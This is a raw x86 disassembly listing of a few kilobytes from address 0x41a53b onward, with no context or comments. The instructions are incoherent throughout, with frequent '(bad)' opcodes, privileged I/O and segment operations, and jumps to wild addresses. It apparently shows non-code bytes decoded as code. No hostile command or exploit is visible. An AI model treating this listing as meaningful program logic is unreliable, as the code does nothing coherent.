  41a53b:	leave  
  41a53c:	lods   eax,DWORD PTR ds:[esi]
  41a53d:	(bad)  
  41a53e:	add    al,BYTE PTR [ecx]
  41a540:	call   0x54c8e802
  41a545:	pop    eax
  41a546:	stos   DWORD PTR es:[edi],eax
  41a547:	pop    edx
  41a548:	jbe    0x41a4db
  41a54a:	inc    esp
  41a54b:	add    BYTE PTR [esi],0xc8
  41a54e:	jb     0x41a590
  41a550:	mov    bh,BYTE PTR [ecx-0x546aa99a]
  41a556:	push   ebx
  41a557:	cli    
  41a558:	push   cs
  41a559:	mov    ah,0x17
  41a55b:	jo     0x41a524
  41a55d:	scas   eax,DWORD PTR es:[edi]
  41a55e:	pop    esi
  41a55f:	sbb    BYTE PTR [ebx-0x1c],bh
  41a562:	mov    edx,0x90ac64d5
  41a567:	sub    al,0x3
  41a569:	repz fs ja 0x41a56f
  41a56d:	mov    ch,0x6b
  41a56f:	(bad)  
  41a570:	jge    0x41a501
  41a572:	ret    
  41a573:	mov    ecx,0x850418fb
  41a578:	ret    0x8bae
  41a57b:	mov    ah,0x10
  41a57d:	js     0x41a5e4
  41a57f:	aam    0xb9
  41a581:	cwde   
  41a582:	enter  0xf777,0xf6
  41a586:	stc    
  41a587:	test   BYTE PTR ds:0xf02c770a,bl
  41a58d:	lods   eax,DWORD PTR ds:[esi]
  41a58e:	int3   
  41a58f:	jmp    0x29c1b5a0
  41a594:	adc    al,0xe4
  41a596:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a597:	lods   al,BYTE PTR ds:[esi]
  41a598:	mov    bh,0xf4
  41a59a:	test   al,0x53
  41a59c:	(bad)  [ebp+0x3d1f3271]
  41a5a2:	push   0xffffff98
  41a5a4:	push   edi
  41a5a5:	pop    ds
  41a5a6:	pop    eax
  41a5a7:	ret    0x5971
  41a5aa:	mov    ah,0xf3
  41a5ac:	lods   eax,DWORD PTR ds:[esi]
  41a5ad:	in     al,0x64
  41a5af:	add    al,0xc4
  41a5b1:	in     eax,dx
  41a5b2:	(bad)  
  41a5b3:	and    eax,0x4637171e
  41a5b8:	sbb    esp,ebx
  41a5ba:	dec    edx
  41a5bb:	or     eax,0xbbf9ed06
  41a5c0:	repz iret 
  41a5c2:	pop    ds
  41a5c3:	sub    ah,BYTE PTR [esi]
  41a5c5:	nop
  41a5c6:	ins    BYTE PTR es:[edi],dx
  41a5c7:	mov    ecx,DWORD PTR [esi+0x51bf1782]
  41a5cd:	sub    al,0xec
  41a5cf:	test   eax,0x9b4bc164
  41a5d4:	push   esi
  41a5d5:	aaa    
  41a5d6:	mov    ecx,0xd312928c
  41a5db:	das    
  41a5dc:	jne    0x41a5b3
  41a5de:	pop    ss
  41a5df:	push   ss
  41a5e0:	jge    0x41a609
  41a5e2:	call   0x936dd72c
  41a5e7:	repnz in ax,0x29
  41a5eb:	sub    ebp,DWORD PTR [edx]
  41a5ed:	dec    ecx
  41a5ee:	jnp    0x41a592
  41a5f0:	mov    bl,0xb5
  41a5f2:	fcomi  st,st(1)
  41a5f4:	and    BYTE PTR [edx+eiz*4],dl
  41a5f7:	xchg   BYTE PTR [esi+0x7f7580fe],ch
  41a5fd:	cli    
  41a5fe:	loope  0x41a62a
  41a600:	pop    ds
  41a601:	in     al,dx
  41a602:	sub    al,0x88
  41a604:	pop    ss
  41a605:	test   al,0xe8
  41a607:	or     edi,DWORD PTR [esi-0x70]
  41a60a:	dec    ecx
  41a60b:	push   cs
  41a60c:	inc    edx
  41a60d:	adc    BYTE PTR [ecx],dh
  41a60f:	xchg   BYTE PTR [eax],ah
  41a611:	inc    esp
  41a612:	jne    0x41a67f
  41a614:	dec    eax
  41a615:	push   ebx
  41a616:	aaa    
  41a617:	lahf   
  41a618:	mov    ch,0xb3
  41a61a:	jnp    0x41a5a4
  41a61c:	mov    ecx,0x5302615e
  41a621:	jbe    0x41a5a5
  41a623:	nop
  41a624:	aas    
  41a625:	xchg   ebp,eax
  41a626:	cs pop ds
  41a628:	shr    ebp,0xb0
  41a62b:	mov    ch,0xa0
  41a62d:	scas   eax,DWORD PTR es:[edi]
  41a62e:	js     0x41a5f9
  41a630:	jmp    0x41a5e7
  41a632:	mov    DWORD PTR [edi],esi
  41a634:	push   eax
  41a635:	loopne 0x41a5b9
  41a637:	mov    ds:0xbb4d5442,eax
  41a63c:	test   BYTE PTR [edi],ah
  41a63e:	cs aad 0x77
  41a641:	jecxz  0x41a5de
  41a643:	jle    0x41a686
  41a645:	loopne 0x41a5fd
  41a647:	add    BYTE PTR [esi],0x49
  41a64a:	call   0x90416f12
  41a64f:	lds    esp,FWORD PTR [eax]
  41a651:	cwde   
  41a652:	jb     0x41a5fe
  41a654:	mul    DWORD PTR [edi-0x1702fd7a]
  41a65a:	sbb    DWORD PTR [ebp-0x55],0x21
  41a65e:	lahf   
  41a65f:	mov    ds,WORD PTR [ebx]
  41a661:	test   eax,0x760cb8f3
  41a666:	mov    WORD PTR [ebp+0x6ab267d3],gs
  41a66c:	xchg   edx,eax
  41a66d:	enter  0xf760,0x4
  41a671:	add    bl,BYTE PTR [ecx+0x12152844]
  41a677:	and    esi,DWORD PTR [esp+ecx*8]
  41a67a:	xchg   BYTE PTR [edx],bh
  41a67c:	jp     0x41a69b
  41a67e:	popa   
  41a67f:	dec    ebx
  41a680:	repz das 
  41a682:	imul   DWORD PTR [esi]
  41a684:	out    0xda,eax
  41a686:	stos   DWORD PTR es:[edi],eax
  41a687:	(bad)  
  41a688:	in     al,dx
  41a689:	push   ebp
  41a68a:	cmp    cl,BYTE PTR [ebp-0x56dd5698]
  41a690:	loopne 0x41a615
  41a692:	or     al,0xf8
  41a694:	jb     0x41a6b1
  41a696:	pop    ebp
  41a697:	pop    esi
  41a698:	adc    al,0x22
  41a69a:	lock bound edx,QWORD PTR [esp+esi*2+0x1118fd3d]
  41a6a2:	pop    esp
  41a6a3:	mov    esi,0xd3389b4
  41a6a8:	mov    bl,0x9f
  41a6aa:	sti    
  41a6ab:	addr16 repz (bad) 
  41a6ae:	cld    
  41a6af:	dec    eax
  41a6b0:	test   al,0x61
  41a6b2:	retf   
  41a6b3:	mov    eax,0x59093141
  41a6b8:	dec    ebx
  41a6b9:	dec    ebx
  41a6ba:	pop    es
  41a6bb:	rcl    DWORD PTR [ebx+eax*1],1
  41a6be:	sub    dl,0x71
  41a6c1:	adc    bh,ch
  41a6c3:	mov    ebx,0x6de4d7a1
  41a6c8:	in     al,dx
  41a6c9:	push   ds
  41a6ca:	mov    ch,BYTE PTR [eax+0x21]
  41a6cd:	(bad)  
  41a6ce:	fidiv  DWORD PTR [eax-0x28e39a44]
  41a6d4:	xor    dl,BYTE PTR [edx+edx*1]
  41a6d7:	test   BYTE PTR [esi-0x45],ch
  41a6da:	jg     0x41a720
  41a6dc:	and    esp,DWORD PTR [ecx-0x331c4b29]
  41a6e2:	mov    ds:0x8d95dce3,al
  41a6e7:	stc    
  41a6e8:	mov    ah,0x3e
  41a6ea:	sub    esi,DWORD PTR [ebp+0x3c]
  41a6ed:	and    al,0xc8
  41a6ef:	addr16 out dx,al
  41a6f1:	or     DWORD PTR [ebx+eiz*1],eax
  41a6f4:	rcr    BYTE PTR [ebx+0x36312ed9],0xbc
  41a6fb:	inc    esp
  41a6fc:	inc    ebx
  41a6fd:	adc    eax,DWORD PTR [edx]
  41a6ff:	jmp    0x517:0x5dc1040d
  41a706:	ins    DWORD PTR es:[edi],dx
  41a707:	ficom  DWORD PTR [edi+edi*2]
  41a70a:	sub    esi,DWORD PTR [ebx+0x46]
  41a70d:	rcl    DWORD PTR ds:0x1903c731,1
  41a713:	add    cl,BYTE PTR [edx+0x2d]
  41a716:	cli    
  41a717:	out    dx,al
  41a718:	xchg   DWORD PTR ss:[ecx+0x21f83c26],ebp
  41a71f:	into   
  41a720:	bound  edx,QWORD PTR [ebp+0x545f7b7c]
  41a726:	call   0x5f959075
  41a72b:	push   0x533b8453
  41a730:	jnp    0x41a75c
  41a732:	cmp    DWORD PTR [edi+0x2cf56bb2],0xffffffbb
  41a739:	mov    dh,0xca
  41a73b:	jbe    0x41a6ec
  41a73d:	(bad)  
  41a73e:	retf   
  41a73f:	inc    ebp
  41a740:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a741:	fadd   QWORD PTR [esi+0x21aec624]
  41a747:	clc    
  41a748:	pop    eax
  41a749:	pop    edx
  41a74a:	ret    
  41a74b:	xor    BYTE PTR [ebp-0xf],dl
  41a74e:	inc    esp
  41a74f:	in     eax,0x31
  41a751:	pmuludq mm1,QWORD PTR [edx]
  41a754:	sub    BYTE PTR [esi],al
  41a756:	out    dx,al
  41a757:	icebp  
  41a758:	mov    bh,0x78
  41a75a:	sti    
  41a75b:	fst    DWORD PTR [eax+ecx*4+0x244881d0]
  41a762:	sar    DWORD PTR [esi-0xa],0xc0
  41a766:	mov    ebp,DWORD PTR [edi]
  41a768:	or     BYTE PTR [esi],bh
  41a76a:	xchg   edi,eax
  41a76b:	or     al,0x1
  41a76d:	ins    BYTE PTR es:[edi],dx
  41a76e:	in     al,0xb5
  41a770:	loope  0x41a782
  41a772:	fwait
  41a773:	pop    ecx
  41a774:	push   es
  41a775:	cmc    
  41a776:	mov    BYTE PTR [edx-0x30f12089],cl
  41a77c:	cmp    cl,BYTE PTR [edx-0x41]
  41a77f:	jbe    0x41a7ac
  41a781:	sbb    ch,BYTE PTR [ecx+0x3a]
  41a784:	xor    ah,ah
  41a786:	loop   0x41a78c
  41a788:	xor    al,0x45
  41a78a:	add    DWORD PTR [edi-0x5aa842dd],0xffffff8f
  41a791:	aaa    
  41a792:	push   edi
  41a793:	adc    ebx,DWORD PTR [edi-0x1235e09b]
  41a799:	xchg   edi,eax
  41a79a:	clc    
  41a79b:	ja     0x41a803
  41a79d:	jecxz  0x41a815
  41a79f:	aas    
  41a7a0:	ins    DWORD PTR es:[edi],dx
  41a7a1:	cmp    eax,0xdf7905d4
  41a7a6:	add    al,0x43
  41a7a8:	sub    DWORD PTR [edx+0x72],ebx
  41a7ab:	(bad)  
  41a7ad:	jle    0x41a7fa
  41a7af:	dec    edi
  41a7b0:	scas   al,BYTE PTR es:[edi]
  41a7b1:	adc    edi,DWORD PTR [edi+0x2458b31d]
  41a7b7:	sub    BYTE PTR [ecx+0x65],dl
  41a7ba:	adc    BYTE PTR [ecx+0x62],ch
  41a7bd:	sbb    eax,0xdc44ca46
  41a7c2:	pop    ecx
  41a7c3:	mov    edx,0xa7e14a58
  41a7c8:	push   eax
  41a7c9:	jecxz  0x41a801
  41a7cb:	in     eax,dx
  41a7cc:	push   eax
  41a7cd:	repnz (bad) [edi]
  41a7d0:	aaa    
  41a7d1:	out    dx,al
  41a7d2:	xlat   BYTE PTR ds:[ebx]
  41a7d3:	ins    DWORD PTR es:[edi],dx
  41a7d4:	mov    ds:0xa49987a0,eax
  41a7d9:	fcmovb st,st(4)
  41a7db:	bound  ebp,QWORD PTR [eax]
  41a7dd:	daa    
  41a7de:	or     eax,0xe0b1bc29
  41a7e3:	xor    DWORD PTR [edx+0x7e],0x71
  41a7e7:	ins    DWORD PTR es:[edi],dx
  41a7e8:	retf   
  41a7e9:	jmp    0x41a7ab
  41a7eb:	jae    0x41a799
  41a7ed:	jbe    0x41a82c
  41a7ef:	dec    ecx
  41a7f0:	xchg   esp,eax
  41a7f1:	push   eax
  41a7f2:	(bad)  
  41a7f5:	stc    
  41a7f6:	fwait
  41a7f7:	pop    ds
  41a7f8:	pop    ebp
  41a7f9:	or     edi,DWORD PTR ss:[ebp+eax*1-0x6f]
  41a7fe:	std    
  41a7ff:	pop    ds
  41a800:	adc    eax,DWORD PTR [ecx]
  41a802:	jp     0x41a7d0
  41a804:	pop    edx
  41a805:	sub    ebp,DWORD PTR [ecx+0x5]
  41a808:	mov    eax,0xe29f04cc
  41a80d:	mov    ebx,0xf0fd8d64
  41a812:	xor    DWORD PTR [ecx-0x48a219a7],edi
  41a818:	jnp    0x41a854
  41a81a:	mov    esp,0x918db133
  41a81f:	out    dx,eax
  41a820:	(bad)  
  41a821:	(bad)  
  41a822:	into   
  41a823:	(bad)  [eax-0x5b2a9239]
  41a829:	mov    cl,0x7c
  41a82b:	icebp  
  41a82c:	cs scas al,BYTE PTR es:[edi]
  41a82e:	dec    esp
  41a82f:	fmul   QWORD PTR [edi+0x7355ddb7]
  41a835:	(bad)  
  41a836:	clc    
  41a837:	add    BYTE PTR [eax-0x1e2d33b8],0x31
  41a83e:	pop    ds
  41a83f:	call   0x34:0x5e50e2dc
  41a846:	and    eax,0xb48b650b
  41a84b:	pushf  
  41a84c:	mov    esp,0x608a4344
  41a851:	(bad)  
  41a852:	cld    
  41a853:	xchg   ebp,eax
  41a854:	cmp    eax,0x58830f79
  41a859:	mov    eax,ds:0xffff4911
  41a85e:	je     0x41a80e
  41a860:	shl    BYTE PTR [edx],0x26
  41a863:	addr16 xor eax,0x1390a8c9
  41a869:	aam    0x92
  41a86b:	ret    0x257b
  41a86e:	pop    es
  41a86f:	(bad)  [edx+0x64e749d8]
  41a875:	mov    ecx,0x791bbd00
  41a87a:	clc    
  41a87b:	xlat   BYTE PTR ds:[ebx]
  41a87c:	inc    esp
  41a87d:	out    dx,eax
  41a87e:	js     0x41a835
  41a880:	movaps xmm0,XMMWORD PTR [edx]
  41a883:	arpl   WORD PTR [ebx-0x4f4e58aa],di
  41a889:	sub    BYTE PTR [edi],ch
  41a88b:	push   edi
  41a88c:	inc    edi
  41a88d:	mov    ch,0x4f
  41a88f:	shl    BYTE PTR [edx+edi*8],0x44
  41a893:	lahf   
  41a894:	adc    al,0x47
  41a896:	pop    ecx
  41a897:	not    BYTE PTR fs:[ebp+0x6d4f8c58]
  41a89e:	cmc    
  41a89f:	cmp    edx,DWORD PTR [ebx-0x20]
  41a8a2:	es jne 0x41a877
  41a8a5:	out    dx,eax
  41a8a6:	test   DWORD PTR [ecx],esi
  41a8a8:	in     al,dx
  41a8a9:	push   0x2a92f312
  41a8ae:	push   cs
  41a8af:	arpl   bx,ax
  41a8b1:	and    eax,0xee39d8bb
  41a8b6:	jp     0x41a8e0
  41a8b8:	adc    edi,DWORD PTR [edx]
  41a8ba:	or     al,0xab
  41a8bc:	mov    BYTE PTR [eax+0x7598f93],dh
  41a8c2:	mov    ecx,0x69972005
  41a8c7:	pop    eax
  41a8c8:	mov    BYTE PTR [ecx+0x28367f0],ch
  41a8ce:	jb     0x41a8e6
  41a8d0:	xlat   BYTE PTR ds:[ebx]
  41a8d1:	loopne 0x41a8f2
  41a8d3:	adc    ah,0xb4
  41a8d6:	rcl    DWORD PTR [edx-0x39],1
  41a8d9:	fisttp WORD PTR ds:0x7753fd9a
  41a8df:	ror    DWORD PTR [ebp-0x6e],1
  41a8e2:	rol    DWORD PTR [ebx+0x26261bbb],0x41
  41a8e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a8ea:	lods   al,BYTE PTR ds:[esi]
  41a8eb:	xor    al,BYTE PTR [ebx-0x61fb98fe]
  41a8f1:	adc    al,0x8f
  41a8f3:	dec    esp
  41a8f4:	mov    ah,0xf
  41a8f6:	pop    esi
  41a8f7:	call   0x39238705
  41a8fc:	(bad)  
  41a8fd:	aas    
  41a8fe:	dec    esp
  41a8ff:	xor    eax,0x67945a0d
  41a904:	cwde   
  41a905:	and    BYTE PTR [edx],0x99
  41a908:	mov    eax,0x216bc20f
  41a90d:	dec    ecx
  41a90e:	aam    0xbc
  41a910:	cmp    al,0x16
  41a912:	xchg   DWORD PTR [edx-0x5f95c492],esi
  41a918:	icebp  
  41a919:	and    cl,BYTE PTR [esi+0x30]
  41a91c:	xchg   ebx,eax
  41a91d:	imul   ebp,esi,0xffffffbf
  41a920:	pop    ebx
  41a921:	jmp    0xc6d0bfc9
  41a926:	retf   
  41a927:	sub    BYTE PTR [edi+0x4b],bh
  41a92a:	xchg   esp,eax
  41a92b:	popf   
  41a92c:	js     0x41a8b3
  41a92e:	jno    0x41a91e
  41a930:	dec    edx
  41a931:	scas   al,BYTE PTR es:[edi]
  41a932:	mov    ch,0x7
  41a934:	dec    ecx
  41a935:	push   ebx
  41a936:	cmp    al,0xea
  41a938:	pop    eax
  41a939:	adc    DWORD PTR [edi-0xf],ebx
  41a93c:	pop    ebx
  41a93d:	and    esi,DWORD PTR [edx+0x6d]
  41a940:	cmp    ch,BYTE PTR [ebp-0x74d78614]
  41a946:	add    al,0x53
  41a948:	mov    ebx,0x40a083c
  41a94d:	cmp    dh,BYTE PTR [edx+eiz*2-0x39d3015b]
  41a954:	or     eax,0x7cf05838
  41a959:	push   esp
  41a95a:	loop   0x41a8de
  41a95c:	test   DWORD PTR [edx+0x5a],ecx
  41a95f:	(bad)  
  41a960:	les    esp,FWORD PTR [esi+0x6e163db6]
  41a966:	cmp    eax,0x1f704a8f
  41a96b:	xchg   BYTE PTR [eax-0x5050ff50],bh
  41a971:	cmp    ch,BYTE PTR [edx+0x69]
  41a974:	(bad)  [edi-0xc]
  41a977:	pop    ebx
  41a978:	jecxz  0x41a95d
  41a97a:	dec    ebx
  41a97b:	push   es
  41a97c:	and    ebp,DWORD PTR [edi-0x74d373e3]
  41a982:	xchg   ebp,eax
  41a983:	and    bl,al
  41a985:	lock pushf 
  41a987:	leave  
  41a988:	je     0x41a97f
  41a98a:	push   ds
  41a98b:	jne    0x41a92c
  41a98d:	push   esi
  41a98e:	out    dx,eax
  41a98f:	neg    DWORD PTR [edx+0x51085cbd]
  41a995:	jns    0x41a9d6
  41a997:	(bad)  
  41a998:	mul    BYTE PTR [esi*1-0x2873cce1]
  41a99f:	ret    
  41a9a0:	xchg   edi,esp
  41a9a2:	inc    ebx
  41a9a3:	shr    DWORD PTR [ebx],cl
  41a9a5:	shl    DWORD PTR [ecx],1
  41a9a7:	fs inc ebx
  41a9a9:	ins    DWORD PTR es:[edi],dx
  41a9aa:	repnz (bad) 
  41a9ac:	add    ebx,DWORD PTR [eax+0x7de1b114]
  41a9b2:	icebp  
  41a9b3:	stos   DWORD PTR es:[edi],eax
  41a9b4:	inc    esi
  41a9b5:	push   ebp
  41a9b6:	stos   DWORD PTR es:[edi],eax
  41a9b7:	(bad)  
  41a9b8:	cmp    eax,0xdf40976f
  41a9bd:	mov    eax,0xd4e9c748
  41a9c2:	int    0xe7
  41a9c4:	adc    BYTE PTR [ebp-0x36aff4ce],dh
  41a9ca:	imul   ebp,edx,0xffffffa4
  41a9cd:	adc    al,0x88
  41a9cf:	outs   dx,BYTE PTR ds:[esi]
  41a9d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a9d1:	pop    esp
  41a9d2:	test   BYTE PTR [ebx+0x40],0xb5
  41a9d6:	iret   
  41a9d7:	loop   0x41aa06
  41a9d9:	adc    eax,0x15a77ea2
  41a9de:	test   al,0x2d
  41a9e0:	shl    BYTE PTR [esi+0x51],0xb4
  41a9e4:	fmul   QWORD PTR [ebp+0x26f421b6]
  41a9ea:	dec    edx
  41a9eb:	dec    edx
  41a9ec:	cs mov ebx,esi
  41a9ef:	shl    BYTE PTR [edx-0x3b],1
  41a9f2:	daa    
  41a9f3:	dec    ebx
  41a9f4:	in     eax,dx
  41a9f5:	push   ss
  41a9f6:	push   edi
  41a9f7:	jle    0x41a9ff
  41a9f9:	mov    al,ds:0x5edfbbb5
  41a9fe:	test   al,0x33
  41aa00:	imul   BYTE PTR [ebp+0x38]
  41aa03:	sub    DWORD PTR [edx-0x60],edi
  41aa06:	daa    
  41aa07:	icebp  
  41aa08:	aad    0xcd
  41aa0a:	mov    edx,eax
  41aa0c:	pop    ss
  41aa0d:	mov    ds:0x5997986e,eax
  41aa12:	mov    esp,0x3463e1e0
  41aa17:	jmp    0xdc7f:0x3378bc4a
  41aa1e:	inc    ecx
  41aa1f:	mov    bh,0x26
  41aa21:	push   edx
  41aa22:	mov    ch,0xc8
  41aa24:	es jbe 0x41aaa1
  41aa27:	xchg   ebp,eax
  41aa28:	mov    ch,0xa0
  41aa2a:	jle    0x41a9b7
  41aa2c:	jg     0x41aa84
  41aa2e:	mov    esp,0xfa3c4c93
  41aa33:	pushf  
  41aa34:	ror    BYTE PTR [edi+ebx*4+0x5f],cl
  41aa38:	call   0x19c08265
  41aa3d:	xor    al,0xf5
  41aa3f:	call   0xecb8174d
  41aa44:	(bad)  
  41aa45:	imul   ebp,DWORD PTR [esi],0x18
  41aa48:	cmp    al,0x12
  41aa4a:	lods   al,BYTE PTR ds:[esi]
  41aa4b:	jbe    0x41a9d8
  41aa4d:	les    ecx,FWORD PTR [edi]
  41aa4f:	fimul  DWORD PTR [esi-0x5b74ed0d]
  41aa55:	gs jnp 0x41aa8a
  41aa58:	xor    esi,eax
  41aa5a:	push   ds
  41aa5b:	nop
  41aa5c:	push   es
  41aa5d:	sub    al,0xf0
  41aa5f:	inc    eax
  41aa60:	icebp  
  41aa61:	or     BYTE PTR [eax-0x33],0xc6
  41aa65:	imul   ebp,esp,0xffffffcc
  41aa68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa69:	lods   al,BYTE PTR ds:[esi]
  41aa6a:	fcmovne st,st(1)
  41aa6c:	xor    al,0x8e
  41aa6e:	add    DWORD PTR [ebx+0x33b5be06],ecx
  41aa74:	adc    esi,DWORD PTR [eax]
  41aa76:	nop
  41aa77:	fbstp  TBYTE PTR [ebp+eiz*2-0x269e3a2c]
  41aa7e:	push   0xfffffff5
  41aa80:	and    ah,BYTE PTR [edi+0x1e]
  41aa83:	(bad)  
  41aa84:	je     0x41aae0
  41aa86:	push   esp
  41aa87:	pop    esp
  41aa88:	fst    QWORD PTR gs:[edi+0x2fd3ce5]
  41aa8f:	int3   
  41aa90:	xchg   esp,eax
  41aa91:	xchg   ecx,eax
  41aa92:	lds    ecx,FWORD PTR [esi-0x5725ebc1]
  41aa98:	xchg   ebp,eax
  41aa99:	or     al,0xee
  41aa9b:	mov    ds:0xf810f54,al
  41aaa0:	and    eax,0x7d6eb61a
  41aaa5:	pop    ds
  41aaa6:	mov    esi,ebx
  41aaa8:	sub    eax,0x34871c39
  41aaad:	add    al,0x2f
  41aaaf:	adc    BYTE PTR ds:0xc3c9c3d5,0x5a
  41aab6:	xor    ah,BYTE PTR [edi]
  41aab8:	cmp    dl,ch
  41aaba:	xor    al,0x99
  41aabc:	xchg   ebp,eax
  41aabd:	dec    ebx
  41aabe:	loope  0x41ab2f
  41aac0:	sbb    al,0x2e
  41aac2:	out    dx,eax
  41aac3:	sbb    al,BYTE PTR [edi-0x36]
  41aac6:	push   ds
  41aac7:	add    DWORD PTR [ebx],edx
  41aac9:	out    dx,al
  41aaca:	mov    edi,0x3a2eb41b
  41aacf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aad0:	lods   al,BYTE PTR ds:[esi]
  41aad1:	daa    
  41aad2:	mov    ebp,0x6588ace2
  41aad7:	mov    bh,0xf1
  41aad9:	dec    edi
  41aada:	rcr    DWORD PTR [edx-0x61],0xa0
  41aade:	imul   esp,DWORD PTR [eax-0x15],0xc8129a6d
  41aae5:	imul   eax,DWORD PTR [ebp-0x59c9915f],0x3f5292bf
  41aaef:	push   ecx
  41aaf0:	repnz data16 lahf 
  41aaf3:	gs cli 
  41aaf5:	fldenv [eax]
  41aaf7:	repz and al,0x61
  41aafa:	popa   
  41aafb:	push   edx
  41aafc:	mov    cl,0x83
  41aafe:	pop    esi
  41aaff:	jnp    0x41ab1c
  41ab01:	lds    ebp,FWORD PTR [esi-0x41]
  41ab04:	sbb    BYTE PTR [ebx],al
  41ab06:	sub    eax,0x702827e
  41ab0b:	outs   dx,BYTE PTR ds:[esi]
  41ab0c:	ins    DWORD PTR es:[edi],dx
  41ab0d:	les    ebx,FWORD PTR [edx+0x60]
  41ab10:	cmp    dh,0xb0
  41ab13:	dec    ecx
  41ab14:	adc    esi,DWORD PTR [edx+0x63]
  41ab17:	mov    gs,WORD PTR [ecx+0x57]
  41ab1a:	test   DWORD PTR [eax+0x68661ad4],eax
  41ab20:	cld    
  41ab21:	sbb    eax,0x7ec0f421
  41ab26:	mov    edi,0x81931df9
  41ab2b:	sbb    al,0xfa
  41ab2d:	shl    DWORD PTR [esi-0x4c],cl
  41ab30:	sub    BYTE PTR [edi+edx*2-0x1f],0xb2
  41ab35:	sbb    ecx,DWORD PTR [eax-0x40]
  41ab38:	shr    dh,1
  41ab3a:	mov    eax,0x96b27b1a
  41ab3f:	sub    eax,0x582858cf
  41ab44:	or     BYTE PTR [eax],bh
  41ab46:	arpl   bp,dx
  41ab48:	xor    BYTE PTR [edi-0x19],al
  41ab4b:	sub    BYTE PTR [ebx+eiz*1],bl
  41ab4e:	lea    eax,[ecx-0xa4c5be9]
  41ab54:	xor    dh,BYTE PTR [esi+0x74]
  41ab57:	dec    esp
  41ab58:	fidivr DWORD PTR [esi+0x3080096e]
  41ab5e:	enter  0xd310,0x1e
  41ab62:	not    DWORD PTR [ecx+eax*1+0x6f534c89]
  41ab69:	mov    BYTE PTR [edx],bl
  41ab6b:	pop    edi
  41ab6c:	mov    ebp,DWORD PTR [eax-0x3c1e0af7]
  41ab72:	sub    BYTE PTR [edi],0x72
  41ab75:	adc    BYTE PTR [eax-0x12],dl
  41ab78:	in     eax,dx
  41ab79:	sbb    al,0x27
  41ab7b:	int3   
  41ab7c:	push   edx
  41ab7d:	cdq    
  41ab7e:	xchg   ecx,eax
  41ab7f:	inc    ebp
  41ab80:	ja     0x41abc2
  41ab82:	add    ebx,DWORD PTR [esi+eax*4+0x19e8663b]
  41ab89:	fimul  DWORD PTR [ecx+0x46d00194]
  41ab8f:	cmp    esi,DWORD PTR [ebp-0x106d4df9]
  41ab95:	cli    
  41ab96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab97:	add    bh,dh
  41ab99:	inc    edx
  41ab9a:	test   BYTE PTR [edi],dh
  41ab9c:	pop    edx
  41ab9d:	shl    DWORD PTR [eax+0x5864c6fd],cl
  41aba3:	push   es
  41aba4:	dec    edx
  41aba5:	dec    esi
  41aba6:	clc    
  41aba7:	daa    
  41aba8:	test   bh,bl
  41abaa:	fs scas al,BYTE PTR es:[edi]
  41abac:	cmp    DWORD PTR [ecx-0x7a],eax
  41abaf:	fidivr DWORD PTR [edx-0x72]
  41abb2:	jge    0x41abbe
  41abb4:	ror    BYTE PTR [esi],1
  41abb6:	dec    edi
  41abb7:	xchg   ebp,eax
  41abb8:	imul   esp,DWORD PTR [ebx],0x9e0d667a
  41abbe:	mov    esp,0x2a4773d6
  41abc3:	out    dx,al
  41abc4:	xchg   esp,eax
  41abc5:	mov    fs,WORD PTR [edi+0x63]
  41abc8:	add    DWORD PTR [edx+0x42],0xf
  41abcc:	push   ds
  41abcd:	jo     0x41abcd
  41abcf:	jmp    0x1e852346
  41abd4:	cmp    al,0x7e
  41abd6:	add    eax,0xf789119b
  41abdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abdc:	and    eax,0x2b6433dc
  41abe1:	mov    bh,0x50
  41abe3:	out    dx,al
  41abe4:	adc    ebp,esp
  41abe6:	stc    
  41abe7:	mov    esi,0x6c92aeb6
  41abec:	mov    WORD PTR [esi],?
  41abee:	push   edi
  41abef:	aam    0x33
  41abf1:	jmp    0xa0dd729d
  41abf6:	aam    0x46
  41abf8:	xchg   edi,eax
  41abf9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abfa:	inc    esp
  41abfb:	outs   dx,BYTE PTR ds:[esi]
  41abfc:	add    al,0x7c
  41abfe:	mov    eax,gs
  41ac00:	mov    ecx,0xff780dd5
  41ac05:	lock mov ds:0x6ca67a38,al
  41ac0b:	sbb    eax,0xc8f28775
  41ac10:	xchg   edx,eax
  41ac11:	adc    eax,esi
  41ac13:	jo     0x41ac0f
  41ac15:	inc    ebx
  41ac16:	ror    cl,0xde
  41ac19:	jb     0x41ac78
  41ac1b:	dec    ecx
  41ac1c:	cmp    eax,0x24bdc521
  41ac21:	jnp    0x41abec
  41ac23:	loope  0x41abd3
  41ac25:	cli    
  41ac26:	dec    esp
  41ac27:	mov    al,0x95
  41ac29:	mov    ds:0x737f4ab5,al
  41ac2e:	call   0x5a2ee2d6
  41ac33:	cmp    al,0x18
  41ac35:	xor    bh,BYTE PTR [ebx]
  41ac37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac38:	xlat   BYTE PTR ds:[ebx]
  41ac39:	pop    esp
  41ac3a:	(bad)  
  41ac3c:	add    eax,0x9bdd1491
  41ac41:	inc    ebp
  41ac42:	dec    ebp
  41ac43:	in     eax,dx
  41ac44:	cmp    bh,dl
  41ac46:	mov    dl,0xd9
  41ac48:	sub    al,0x12
  41ac4a:	retf   0xae37
  41ac4d:	fsubr  DWORD PTR [ebx-0x5d508f22]
  41ac53:	pop    es
  41ac54:	push   edi
  41ac55:	rcl    ebx,cl
  41ac57:	mov    WORD PTR [esi],cs
  41ac59:	ds jp  0x41acae
  41ac5c:	outs   dx,DWORD PTR ds:[esi]
  41ac5d:	fsubr  st,st(4)
  41ac5f:	test   eax,0x19447cb
  41ac64:	(bad)  
  41ac65:	pop    edi
  41ac66:	mov    edx,0xbd1e3114
  41ac6b:	rcl    bl,1
  41ac6d:	and    al,0x54
  41ac6f:	xor    eax,0x22e66dad
  41ac74:	pop    ss
  41ac75:	adc    edx,DWORD PTR [ecx-0x8]
  41ac78:	push   es
  41ac79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac7a:	xor    DWORD PTR [eax+0x6002bcad],ecx
  41ac80:	pop    ecx
  41ac81:	adc    DWORD PTR [ecx],eax
  41ac83:	mov    ?,WORD PTR [edi]
  41ac85:	mov    dh,0x14
